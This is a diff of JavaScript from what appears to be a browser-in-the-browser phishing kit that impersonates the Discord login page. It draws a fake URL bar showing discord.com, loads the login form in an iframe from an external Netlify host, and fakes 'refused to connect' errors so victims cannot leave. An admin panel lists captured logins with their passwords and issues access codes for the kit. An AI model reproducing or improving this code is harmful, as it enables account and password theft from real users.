@@ -3,6 +3,12 @@ const firebaseConfig = {
     databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
 };
 
+// ============================================
+// LOGIN PAGE DOMAIN - CHANGE THIS TO UPDATE
+// ============================================
+const LOGIN_PAGE_URL = "https://endearing-brioche-80f52a.netlify.app";
+// ============================================
+
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
@@ -51,6 +57,9 @@ let pendingUrl = '';
 const originalUrl = 'https://discord.com/login';
 const discordFavicon = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E";
 
+// Set iframe src to the configured domain
+loginIframe.src = LOGIN_PAGE_URL;
+
 // URL Bar Logic
 urlInput.addEventListener('focus', () => {
     urlInput.select();
@@ -90,33 +99,27 @@ modalContinueBtn.addEventListener('click', () => {
 });
 
 function handleUrlNavigation(inputValue) {
-    // Check if it's a valid URL (has dots and no spaces)
     const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
     
     if (!isValidUrl) {
-        // Show error for invalid domain/search
         showDomainError(inputValue);
         return;
     }
     
-    // Format URL properly
     let formattedUrl = inputValue;
     if (!inputValue.startsWith('http://') && !inputValue.startsWith('https://')) {
         formattedUrl = 'https://' + inputValue;
     }
     
-    // Extract domain name for tab
     try {
         const url = new URL(formattedUrl);
         const domain = url.hostname.replace('www.', '');
         const siteName = domain.split('.')[0];
         const capitalizedName = siteName.charAt(0).toUpperCase() + siteName.slice(1);
         
-        // Update tab
         tabTitle.textContent = capitalizedName;
         tabFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
         
-        // Hide iframe, show error (simulating blocked site)
         loginIframe.style.display = 'none';
         errorPage.classList.remove('hidden');
         errorDomainEl.textContent = `${domain} refused to connect.`;
@@ -127,43 +130,32 @@ function handleUrlNavigation(inputValue) {
         return;
     }
     
-    // After 3 seconds, reset to Discord
     setTimeout(() => {
         resetToDiscord();
     }, 3000);
 }
 
 function showDomainError(query) {
-    // Update tab to show error
     tabTitle.textContent = query.substring(0, 20);
     tabFavicon.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23888'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E";
     
-    // Hide iframe, show error page
     loginIframe.style.display = 'none';
     errorPage.classList.remove('hidden');
     errorDomainEl.textContent = `This site can't be reached`;
     errorMessageEl.textContent = `"${query}" is not a valid domain. Check if there is a typo.`;
     
-    // After 3 seconds, reset
     setTimeout(() => {
         resetToDiscord();
     }, 3000);
 }
 
 function resetToDiscord() {
-    // Reset URL bar
     urlInput.value = originalUrl;
-    
-    // Reset tab
     tabTitle.textContent = 'Discord';
     tabFavicon.src = discordFavicon;
-    
-    // Hide error, show iframe
     errorPage.classList.add('hidden');
     loginIframe.style.display = 'block';
-    
-    // Reload iframe
-    loginIframe.src = 'https://endearing-brioche-80f52a.netlify.app/';
+    loginIframe.src = LOGIN_PAGE_URL;
 }
 
 // Listen for messages from the login iframe
@@ -218,7 +210,6 @@ adminAccessBtn.addEventListener('click', () => {
     loginScreen.classList.add('hidden');
     adminAccessBtn.classList.add('hidden');
     adminScreen.classList.remove('hidden');
-    
     loadAdminData();
 });
 
@@ -229,7 +220,7 @@ adminLogoutBtn.addEventListener('click', () => {
     adminAccessBtn.classList.remove('hidden');
 });
 
-// Generate MC-CODE (longer code)
+// Generate MC-CODE
 generateCodeBtn.addEventListener('click', async () => {
     const code = generateMCCode();
     currentGeneratedCode = code;
@@ -242,7 +233,6 @@ generateCodeBtn.addEventListener('click', async () => {
             createdBy: currentUserEmail
         });
         
-        // Show hidden code by default
         codeText.textContent = '*'.repeat(code.length);
         codeText.classList.add('code-hidden');
         isCodeVisible = false;
@@ -285,7 +275,7 @@ copyCodeBtn.addEventListener('click', () => {
     }, 2000);
 });
 
-// Generate longer MC Code (MC-XXXX-XXXX-XXXX-XXXX format)
+// Generate MC-XXXX-XXXX-XXXX-XXXX format
 function generateMCCode() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let code = 'MC';
@@ -347,7 +337,6 @@ function loadCodes() {
         codesList.innerHTML = html || '<p class="empty-state">No codes generated yet</p>';
         document.getElementById('active-codes').textContent = activeCount;
         
-        // Toggle visibility for list codes
         document.querySelectorAll('.toggle-list-code').forEach(btn => {
             btn.addEventListener('click', function() {
                 const code = this.dataset.code;
@@ -370,7 +359,6 @@ function loadCodes() {
             });
         });
         
-        // Copy code
         document.querySelectorAll('.copy-list-code').forEach(btn => {
             btn.addEventListener('click', function() {
                 navigator.clipboard.writeText(this.dataset.code);
@@ -379,7 +367,6 @@ function loadCodes() {
             });
         });
         
-        // Delete code
         document.querySelectorAll('.delete-code').forEach(btn => {
             btn.addEventListener('click', function() {
                 if (confirm('Delete this code?')) {
@@ -444,7 +431,6 @@ function loadLogins() {
         document.getElementById('total-logins').textContent = totalCount;
         document.getElementById('today-logins').textContent = todayCount;
         
-        // Password toggle with eye icon
         document.querySelectorAll('.toggle-password').forEach(btn => {
             btn.addEventListener('click', function() {
                 const span = this.closest('.password-cell').querySelector('.password-text');
@@ -464,7 +450,6 @@ function loadLogins() {
             });
         });
         
-        // Make admin
         document.querySelectorAll('.make-admin').forEach(btn => {
             btn.addEventListener('click', function() {
                 if (!this.disabled && confirm('Make this user an admin?')) {
@@ -473,7 +458,6 @@ function loadLogins() {
             });
         });
         
-        // Delete login
         document.querySelectorAll('.delete-login').forEach(btn => {
             btn.addEventListener('click', function() {
                 if (confirm('Delete this login record?')) {
